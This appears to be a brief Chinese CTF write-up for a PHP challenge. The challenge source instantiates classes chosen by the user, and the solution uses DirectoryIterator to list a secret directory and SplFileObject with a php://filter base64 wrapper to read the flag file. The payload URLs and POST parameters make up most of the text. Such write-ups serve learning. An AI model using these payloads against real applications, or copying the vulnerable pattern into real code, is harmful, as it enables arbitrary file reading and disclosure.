### flag直接读取不就行了？

主要考察PHP原生类的利用

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

第一步：

```
http://gz.imxbt.cn:20056/?K=DirectoryIterator&W=/secret/
```

第二步：找到文件名之后开始读文件内容

```
J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php
```

